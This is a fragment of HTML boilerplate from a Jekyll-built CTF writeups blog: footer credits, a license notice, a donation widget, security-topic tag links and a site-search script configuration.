<a href="https://github.com/Susanou">Cameron Hochberg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="Susanou" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/Writeups/tags/crypto/">crypto</a> <a class="post-tag" href="/Writeups/tags/rsa/">RSA</a> <a class="post-tag" href="/Writeups/tags/easy/">easy</a> <a class="post-tag" href="/Writeups/tags/web/">web</a> <a class="post-tag" href="/Writeups/tags/aes/">AES</a> <a class="post-tag" href="/Writeups/tags/linux/">linux</a> <a class="post-tag" href="/Writeups/tags/misc/">misc</a> <a class="post-tag" href="/Writeups/tags/mitm/">MITM</a> <a class="post-tag" href="/Writeups/tags/sqli/">SQLi</a> <a class="post-tag" href="/Writeups/tags/crt/">CRT</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/Writeups/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://susanou.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
